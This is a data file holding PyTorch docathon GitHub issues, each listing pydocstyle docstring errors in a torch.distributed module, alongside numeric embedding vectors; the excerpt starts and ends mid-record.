 -3.34346473e-01 -2.51710236e-01 -1.06037349e-01  3.43247354e-01
 -4.69158769e-01 -3.76022421e-04 -3.02338451e-01 -2.98962116e-01
 -7.81363696e-02  3.77489664e-02 -4.61922437e-02  2.17087179e-01
  9.69130695e-02 -2.01393384e-02  2.52376050e-01 -1.62647784e-01
  3.25628340e-01  1.48443431e-01  3.11680436e-01 -1.87105700e-01
  7.92507175e-03  3.35029691e-01  5.51714525e-02  2.29183391e-01
 -1.04250573e-01 -1.84902877e-01 -9.07469168e-02 -1.35164022e-01
  4.13590074e-02 -3.91434342e-01 -1.99610949e-01  8.62217322e-02
  4.52274755e-02 -6.18218407e-02  1.63379893e-01  9.21538770e-02
  2.23257333e-01 -1.25074357e-01  9.42063183e-02 -1.31222233e-02
  5.14832400e-02  7.01230019e-02  2.82678843e-01  1.83400940e-02
 -1.59374952e-01  1.81556307e-02 -2.38021687e-01  2.82416269e-02
  2.14400679e-01  1.95731282e-01 -2.92922389e-02  5.34790605e-02
  1.17341794e-01  3.75887752e-02  2.27119088e-01  2.56783739e-02
  5.35891131e-02 -1.49193436e-01  1.77086234e-01  5.31517603e-02
 -1.51616782e-01  1.48399413e-01  3.14459205e-01  1.58916265e-01
 -1.36405557e-01 -2.17725962e-01  3.11762653e-02 -5.36849126e-02
 -2.87821025e-01 -3.68586004e-01 -2.80015469e-01 -3.23616862e-01
  2.95321465e-01  3.20421547e-01 -4.13382441e-01  3.75879198e-01
  8.69793296e-02  1.66808113e-01  3.93090630e-03  5.22955284e-02
 -2.45746031e-01  4.61661965e-01  4.06313799e-02  7.67365843e-02
  3.83110881e-01  1.51619390e-01  2.53004208e-02 -2.82078505e-01
 -7.82158375e-02  4.21180241e-02 -2.00853981e-02 -2.26475485e-02
 -2.24262536e-01  1.13388523e-01 -1.78108454e-01 -1.87721014e-01
 -4.32682306e-01 -1.23627976e-01 -2.86692847e-02  1.15286797e-01
 -3.11754160e-02 -6.81768432e-02  1.46887124e-01  1.48868442e-01
 -1.89018529e-02 -3.25246334e-01  2.86051091e-02  3.04492831e-01
  1.53330266e-01  6.30753696e-01  1.38103962e-01  8.17259401e-02
 -1.70622021e-01  1.39136225e-01  2.73542523e-01 -1.66705206e-01
  1.17836595e-01  3.43738914e-01 -9.52089280e-02 -2.87587136e-01
  1.80906028e-01  5.42205349e-02 -1.52809501e-01 -1.78835727e-02
  2.68161744e-01  4.89286572e-01  4.18256670e-02  2.26000339e-01
 -2.51572162e-01  2.31323913e-01  2.56249249e-01 -1.55781060e-01
  3.44726086e-01 -1.21886261e-01 -3.68727356e-01 -3.25175881e-01
 -2.24639505e-01  8.01341981e-02 -3.86300057e-01 -1.40646040e-01
  6.26593679e-02 -2.04458207e-01 -2.14178041e-01  2.53066182e-01
 -6.38360828e-02 -3.14143986e-01  3.32565963e-01 -3.08235493e-02
 -2.60504514e-01  6.13130182e-02 -1.94420308e-01 -3.29681307e-01
  2.93516755e-01  1.46056861e-01 -6.75369203e-02 -1.25127375e-01
  2.37847343e-02 -1.21710092e-01  6.13651332e-03 -1.25196502e-01
  5.43213248e-01 -1.07397050e-01  1.24576017e-01  2.68385053e-01
 -1.47753879e-01 -6.84897825e-02  1.12612039e-01  3.12514603e-01
 -1.65948078e-01 -1.78963035e-01  4.09896523e-02  1.90045312e-02
  1.03307515e-01 -8.39394554e-02 -1.77173823e-01  2.21295096e-02
 -2.73949325e-01  1.74606949e-01  6.19075820e-03 -3.41829658e-01
 -7.42244124e-02 -7.62077421e-02  6.11753702e-01  8.24178755e-02
 -2.77205288e-01 -3.82870343e-03 -5.31218424e-02  1.28085345e-01
 -8.55469108e-02  1.70255780e-01 -3.43846567e-02  2.01509625e-01
  3.53455365e-01 -2.18759343e-01 -1.81535244e-01  2.01124251e-01
 -1.72478124e-01 -1.25367880e-01  1.94657415e-01 -5.95401049e-01
  3.81842762e-01  2.08704308e-01  3.57618481e-01  4.58830073e-02
  3.20694208e-01 -4.25423943e-02  4.91402894e-02 -4.22421582e-02
 -1.93639413e-01  4.26557690e-01 -4.17752802e-01  5.43483682e-02
  3.64399314e-01 -2.02264786e-01 -2.19666928e-01 -8.40967223e-02
 -5.06068230e-01 -1.94901869e-01 -2.08598554e-01  1.78213984e-01
  4.48409647e-01 -3.84243168e-02 -3.62251699e-03  1.91867381e-01
  1.72082484e-02  1.16516367e-01  2.30302870e-01  1.70983136e-01
 -4.32383776e-01 -8.45133215e-02 -7.70614594e-02  3.17100763e-01
 -3.68629172e-02  1.77179217e-01  7.79619366e-02  1.21283736e-02
  1.11173376e-01 -3.23970824e-01  3.63243759e-01  3.92977148e-01
 -2.79211819e-01  2.60738909e-01 -8.56385380e-02  4.30048630e-02
  1.76976211e-02  4.44330275e-01  1.61212832e-01  5.25548086e-02
  7.47333094e-03 -3.25872481e-01 -1.99458808e-01  9.00429562e-02
 -2.44098157e-03 -1.13491602e-02 -5.28743982e-01  7.78478384e-02
 -2.93459773e-01 -2.43224651e-01  2.56146908e-01  7.40657747e-02
 -4.19517756e-02  2.10152194e-03 -6.08904921e-02 -6.97129369e-02
 -1.32218838e-01  2.59294629e-01 -1.03064448e-01 -2.87691295e-01
  1.47908246e-02 -1.98729634e-01  7.00232312e-02 -5.89209914e-01
 -1.54016539e-01 -5.01938276e-02  2.16643840e-01  1.46471098e-01
 -5.00324309e-01 -3.37232202e-01  4.56693798e-01 -7.49790743e-02
 -3.95932347e-01  1.10203236e-01 -1.00546539e-01  5.35340309e-01
  8.00794922e-04  3.21249485e-01 -5.24188280e-02  3.97267699e-01
 -5.51963925e-01  8.72823745e-02 -2.54036039e-01 -2.30995268e-01
 -1.07564822e-01 -2.42299870e-01 -1.02557130e-01  9.29979421e-03
  1.17051452e-01  1.22929923e-03 -2.63611138e-01  1.94425032e-01
 -1.78247824e-01  2.34621644e-01  3.50358844e-01  1.15049586e-01
  5.55003136e-02  9.90148932e-02 -2.66703535e-02 -3.48516643e-01
 -3.25201035e-01  3.74233961e-01  2.86782116e-01 -1.19658768e-01]"
Fix docstring errors in zero_redundancy_optimizer.py module: docs triaged medium docathon-h2-2023,"Please fix the following issues. To test locally, run: 
 ```
pydocstyle path-to-file --count
```
Run this command before and after fixing the errors. This command prints out the number of errors at the end of the output. Paste the output to your PR description with the number before and after. 
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_recursive_copy_to_device`, **Line**: 33, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_recursive_copy_to_device`, **Line**: 33, **Description**: First line should end with a period (not 'f')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_is_trainable`, **Line**: 63, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_is_trainable`, **Line**: 63, **Description**: First line should end with a period (not 'o')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_is_trainable`, **Line**: 63, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_broadcast_object`, **Line**: 76, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_broadcast_object`, **Line**: 76, **Description**: First line should end with a period (not 'm')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `main_hook`, **Line**: 123, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `main_hook`, **Line**: 123, **Description**: First line should end with a period (not 'f')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `main_hook`, **Line**: 123, **Description**: First line should be in imperative mood (perhaps 'Perform', not 'Performs')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_DDPBucketAssignment`, **Line**: 131, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_DDPBucketAssignment`, **Line**: 131, **Description**: First line should end with a period (not ',')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_OverlapStatus`, **Line**: 167, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_OverlapStatus`, **Line**: 167, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_OverlapStatus`, **Line**: 167, **Description**: First line should end with a period (not 't')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_OverlapInfo`, **Line**: 186, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_OverlapInfo`, **Line**: 186, **Description**: First line should end with a period (not '`')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `wait_for_broadcasts`, **Line**: 253, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `wait_for_broadcasts`, **Line**: 253, **Description**: First line should end with a period (not 'l')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `wait_for_broadcasts`, **Line**: 253, **Description**: First line should be in imperative mood (perhaps 'Wait', not 'Waits')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `clear_per_iter_info`, **Line**: 266, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `clear_per_iter_info`, **Line**: 266, **Description**: First line should end with a period (not 'd')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `clear_per_iter_info`, **Line**: 266, **Description**: First line should be in imperative mood (perhaps 'Clear', not 'Clears')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `ZeroRedundancyOptimizer`, **Line**: 276, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `ZeroRedundancyOptimizer`, **Line**: 276, **Description**: First line should end with a period (not 'r')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_clear_cache`, **Line**: 442, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_clear_cache`, **Line**: 442, **Description**: First line should be in imperative mood (perhaps 'Clear', not 'Clears')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `consolidate_state_dict`, **Line**: 499, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `consolidate_state_dict`, **Line**: 499, **Description**: First line should end with a period (not 't')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_verify_params_per_rank`, **Line**: 584, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_verify_params_per_rank`, **Line**: 584, **Description**: First line should end with a period (not ',')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_verify_params_per_rank`, **Line**: 584, **Description**: First line should be in imperative mood (perhaps 'Verify', not 'Verifies')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_partition_param_group`, **Line**: 616, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_partition_param_group`, **Line**: 616, **Description**: First line should end with a period (not 'o')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_param_to_rank`, **Line**: 709, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_param_to_rank`, **Line**: 709, **Description**: First line should end with a period (not 'k')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_param_to_index`, **Line**: 722, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_param_to_index`, **Line**: 722, **Description**: First line should end with a period (not 'l')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_index_to_param`, **Line**: 738, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_index_to_param`, **Line**: 738, **Description**: First line should end with a period (not 'e')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_broadcast_params_from_rank`, **Line**: 749, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_broadcast_params_from_rank`, **Line**: 749, **Description**: First line should end with a period (not 'r')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_sync_params`, **Line**: 798, **Description**: First line should be in imperative mood (perhaps 'Sync', not 'Syncs')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_device_to_params_per_rank`, **Line**: 816, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_device_to_params_per_rank`, **Line**: 816, **Description**: First line should end with a period (not 'r')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_get_min_index`, **Line**: 859, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_get_min_index`, **Line**: 859, **Description**: First line should end with a period (not 't')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_get_min_index`, **Line**: 859, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_assign_bucket_subset_to_rank`, **Line**: 887, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_assign_bucket_subset_to_rank`, **Line**: 887, **Description**: First line should end with a period (not 'a')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_assign_bucket_subset_to_rank`, **Line**: 887, **Description**: First line should be in imperative mood (perhaps 'Assign', not 'Assigns')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_bucket_assignments_per_rank`, **Line**: 921, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_bucket_assignments_per_rank`, **Line**: 921, **Description**: First line should end with a period (not 's')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_local_step`, **Line**: 1018, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_local_step`, **Line**: 1018, **Description**: First line should end with a period (not 's')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_local_step`, **Line**: 1018, **Description**: First line should be in imperative mood (perhaps 'Perform', not 'Performs')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `step`, **Line**: 1092, **Description**: First line should be in imperative mood (perhaps 'Perform', not 'Performs')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `join_hook`, **Line**: 1119, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `join_hook`, **Line**: 1119, **Description**: First line should end with a period (not 'y')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `join_hook`, **Line**: 1119, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `load_state_dict`, **Line**: 1145, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `load_state_dict`, **Line**: 1145, **Description**: First line should end with a period (not 't')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `state_dict`, **Line**: 1184, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_sync_param_groups`, **Line**: 1252, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_sync_param_groups`, **Line**: 1252, **Description**: First line should end with a period (not 'e')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_sync_param_groups`, **Line**: 1252, **Description**: First line should be in imperative mood (perhaps 'Sync', not 'Syncs')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_build_param_buckets`, **Line**: 1275, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_build_param_buckets`, **Line**: 1275, **Description**: First line should end with a period (not 'o')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_build_param_buckets`, **Line**: 1275, **Description**: First line should be in imperative mood (perhaps 'Build', not 'Builds')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_build_ddp_param_buckets`, **Line**: 1335, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_build_ddp_param_buckets`, **Line**: 1335, **Description**: First line should end with a period (not 'e')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_verify_and_init_params`, **Line**: 1377, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_verify_and_init_params`, **Line**: 1377, **Description**: First line should end with a period (not '`')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_verify_and_init_params`, **Line**: 1377, **Description**: First line should be in imperative mood (perhaps 'Verify', not 'Verifies')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_verify_same_dense_param_type`, **Line**: 1434, **Description**: First line should be in imperative mood (perhaps 'Verify', not 'Verifies')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_get_is_trainable_mask`, **Line**: 1465, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_get_is_trainable_mask`, **Line**: 1465, **Description**: First line should end with a period (not 'e')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_get_is_trainable_mask`, **Line**: 1465, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_init_local_optimizer`, **Line**: 1472, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_init_local_optimizer`, **Line**: 1472, **Description**: First line should end with a period (not 'f')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_init_local_optimizer`, **Line**: 1472, **Description**: First line should be in imperative mood (perhaps 'Initialize', not 'Initializes')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_init_zero_for_overlap`, **Line**: 1546, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_init_zero_for_overlap`, **Line**: 1546, **Description**: First line should end with a period (not 'e')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_init_zero_for_overlap`, **Line**: 1546, **Description**: First line should be in imperative mood (perhaps 'Perform', not 'Performs')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_get_assigned_rank`, **Line**: 1561, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_get_assigned_rank`, **Line**: 1561, **Description**: First line should end with a period (not '`')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_get_assigned_rank`, **Line**: 1561, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_check_overlap_initialized`, **Line**: 1577, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_check_overlap_initialized`, **Line**: 1577, **Description**: First line should end with a period (not 'e')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_check_overlap_initialized`, **Line**: 1577, **Description**: First line should be in imperative mood (perhaps 'Check', not 'Checks')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_get_optimizer_constructor`, **Line**: 1598, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_get_optimizer_constructor`, **Line**: 1598, **Description**: First line should end with a period (not 'y')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_get_optimizer_constructor`, **Line**: 1598, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/distributed/optim/zero_redundancy_optimizer.py`, **Entity**: `_get_optimizer_constructor`, **Line**: 1598, **Description**: No blank lines allowed between a section header and its content ('Returns')

cc @carljparker",False,"[-0.09797297 -0.05732688 -0.00904902 -0.07682943  0.16365388 -0.18084615
 -0.12528001  0.24329191 -0.36363998  0.10369189  0.01341338  0.04639209
  0.19107033  0.10849811 -0.1922444   0.02283228 -0.30682826 -0.409644
  0.06521843  0.06333412 -0.03171575  0.3367813  -0.17054662 -0.02685342
  0.12404563  0.12492422 -0.47708714 -0.06655207  0.01851057  0.01811707
  0.37515152  0.12832719 -0.08032352  0.0038825   0.425378    0.19454733
 -0.18964083 -0.16368616  0.00638556  0.0784056   0.0356234  -0.05460984
 -0.16055882  0.10647369  0.01413821 -0.1746108  -0.20660459  0.34938386
 -0.03859808  0.11563666 -0.0865615   0.14385064 -0.25739634 -0.10541713
  0.14460358 -0.0816214  -0.0421219   0.5229202   0.03663867 -0.09284164
  0.31803674  0.18670082 -0.14464691 -0.10715285 -0.05138133  0.34882817
  0.05350273 -0.00883889  0.24176317  0.29584002 -0.11670139 -0.04645018
 -0.29468474 -0.27569216  0.03386912  0.22449306 -0.49797785  0.04669255
 -0.25342634 -0.2510251  -0.08526537  0.06209845 -0.14046264  0.11775737
  0.02990191 -0.1932169   0.2838195  -0.07782169  0.55397916  0.01994001
  0.27902824  0.05549652 -0.16152558  0.2802723   0.17323226  0.10699818
 -0.21058321 -0.14041576  0.00554817 -0.09096473  0.14735729 -0.3021728
 -0.2688263   0.04568681 -0.04119591 -0.13204917  0.12910159  0.11398438
  0.11783791  0.02640866  0.21094656 -0.07088748  0.02719967  0.02250897
  0.21744995  0.20884594 -0.11416353 -0.03603433 -0.32278386  0.05227219
  0.31294036  0.2241945  -0.0694545   0.06204464  0.21283218  0.02774683
  0.14154452 -0.04838569  0.04085933 -0.07507844  0.1365166   0.00235949
 -0.17758217  0.12721187  0.30383337  0.2215477  -0.08630878 -0.14250745
  0.00399006  0.0805164  -0.345856   -0.27404398 -0.19944245 -0.30625886
  0.24006906  0.19138783 -0.47117203  0.2696598   0.1303033   0.03121782
 -0.17703706  0.03853452 -0.23664245  0.37072927  0.02524595  0.03770928
  0.46745205  0.07407794 -0.09568686 -0.29887742 -0.11927603  0.09291662
 -0.08133673 -0.04673073 -0.21184546  0.19351137 -0.24072948 -0.13718806
 -0.4794749   0.03165791  0.05531005 -0.03243763  0.08084576 -0.03770152
  0.13185291  0.13988209  0.04318799 -0.14153439 -0.08567446  0.17670114
  0.22345398  0.62615764  0.10670486  0.07821909 -0.19894838  0.19464175
  0.1650962  -0.06882066  0.08755298  0.22037281 -0.20445614 -0.21321723
  0.24378568  0.07732784 -0.06727199  0.00999579  0.20988914  0.4036721
  0.14259717  0.32016802 -0.40300098  0.23545754  0.2215364  -0.20262209
  0.5173907  -0.04494628 -0.44431293 -0.4227515  -0.14556761  0.12331244
 -0.36605132 -0.22044371  0.12018201 -0.3741501  -0.3154893   0.40262574
 -0.12825061 -0.3386674   0.3728821   0.01913449 -0.23418212 -0.05404736
 -0.09342949 -0.28944707  0.18352595 -0.02067656 -0.04546269 -0.07922018
 -0.10056683  0.06953217 -0.02495367 -0.186588    0.4775305  -0.16916452
 -0.04637137  0.18591759 -0.07777296 -0.10739741 -0.08041783  0.23792492
 -0.10946289 -0.30235735  0.02657292  0.1125657   0.22246072  0.08282721
 -0.20050962  0.08144148 -0.19696742  0.15445763 -0.14190078 -0.25272784
  0.03281621 -0.07947227  0.5019136   0.09703331 -0.14361706 -0.04757258
 -0.0072567  -0.00512854 -0.05203118  0.30272606 -0.19456276  0.3144823
  0.33120692 -0.25525278 -0.23521948  0.04229128 -0.0408924  -0.24341893
  0.18597856 -0.61440647  0.39840645  0.19720033  0.17893413  0.02175206
  0.4103291   0.02247539  0.16233668 -0.03754238 -0.16566409  0.34766686
 -0.32294405  0.024578    0.33929044 -0.11814283 -0.21035412 -0.18168683
 -0.49342376 -0.1537022  -0.22880548  0.2555306   0.26468843  0.11649282
 -0.1105797   0.21852207  0.03010622 -0.10344492  0.1587086   0.10759155
 -0.30686688  0.0236242  -0.13282844  0.25532126 -0.01041101  0.27574787
  0.10559525  0.14404799  0.1657274  -0.1871808   0.25336847  0.3431895
 -0.20248806  0.42194742 -0.21595033  0.00625229  0.03736877  0.44148728
 -0.0193095   0.10833351 -0.05703652 -0.30461034 -0.12907769  0.23322135
  0.0772162  -0.06993476 -0.5415924   0.12416289 -0.40456504 -0.36296007
  0.34560877 -0.01741439 -0.030193   -0.13624835 -0.0994164  -0.12952207
 -0.09332553  0.32810646 -0.07654352 -0.29749084  0.0236036  -0.16259044
  0.02264186 -0.6271133  -0.05513233 -0.05603812  0.20130482  0.16738372
 -0.31471324 -0.3642385   0.43848115 -0.08314564 -0.3130441  -0.02263277
 -0.25985587  0.44562     0.0341759   0.4007494  -0.12050766  0.11435543
 -0.5520907   0.14802258 -0.31223553 -0.20324098 -0.15615226 -0.3542805
 -0.0247326   0.02196876  0.25924778 -0.06022427 -0.25915518  0.31015754
 -0.19465587  0.32536745  0.28849828  0.06756276  0.13862006  0.06222966
  0.0434434  -0.14966153 -0.22964436  0.2345291   0.10201433  0.06490389]"
Fix docstring errors in distributed_c10d.py module: docs triaged medium docathon-h2-2023,"Please fix the following issues. To test locally, run: 
 ```
pydocstyle path-to-file --count
```
Run this command before and after fixing the errors. This command prints out the number of errors at the end of the output. Paste the output to your PR description with the number before and after. 
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `Backend`, **Line**: 148, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `Backend`, **Line**: 148, **Description**: First line should end with a period (not 'd')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `register_backend`, **Line**: 195, **Description**: First line should be in imperative mood (perhaps 'Register', not 'Registers')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `_reduce_op`, **Line**: 324, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `_reduce_op`, **Line**: 324, **Description**: First line should end with a period (not ',')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `_World`, **Line**: 416, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `_World`, **Line**: 416, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `default_pg`, **Line**: 430, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `pg_map`, **Line**: 442, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `pg_map`, **Line**: 442, **Description**: First line should end with a period (not 's')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `pg_group_ranks`, **Line**: 464, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `pg_group_ranks`, **Line**: 464, **Description**: First line should end with a period (not 'g')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `pg_backend_config`, **Line**: 473, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `pg_backend_config`, **Line**: 473, **Description**: First line should end with a period (not 'g')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `group_count`, **Line**: 492, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `_WorldMeta`, **Line**: 520, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `_WorldMeta`, **Line**: 520, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `_WorldMeta`, **Line**: 520, **Description**: First line should end with a period (not 'y')
- **File**: `torch/distributed/distributed_c10d.py`, **Entity**: `_get_pg_default_device`, **Line**: 546, **Description**: 1 blank line required between summary line and description (found 0)
